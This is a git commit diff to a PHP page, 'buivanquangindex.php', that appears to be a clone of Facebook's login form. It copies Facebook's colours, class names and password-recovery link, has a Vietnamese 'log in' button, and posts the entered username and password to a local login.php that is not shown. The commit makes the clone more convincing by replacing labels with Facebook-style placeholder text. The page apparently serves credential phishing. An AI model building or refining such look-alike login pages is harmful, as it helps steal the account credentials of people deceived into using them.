7865bf84d9251f08fe1131a35bd71149aabec854
Vanquy1306 <59086073+Vanquy1306@users.noreply.github.com>
2020-09-29 10:35:00 +0700

    Update buivanquangindex.php

--- buivanquangindex.php
+++ buivanquangindex.php
@@ -17,10 +17,8 @@
 					</div>
 			<div class="content-right">
 						<form method="POST" action="login.php">
-					<label for="username">Username:</label>
-					<input name="username" type="text" id="username"></input><br /><br />
-					<label for="password">Password:</label>
-					<input name="password" id="password" type="password"></input><br />
+					<input name="username" type="text" placeholder="Email address or phone number"></input><br /><br />
+					<input name="password" id="password" type="password" placeholder="Password">></input><br />
 					<input type="submit" name="submit" value="Đăng Nhập" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
                                         <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Quên mật khẩu?</a></div>
 						</form>
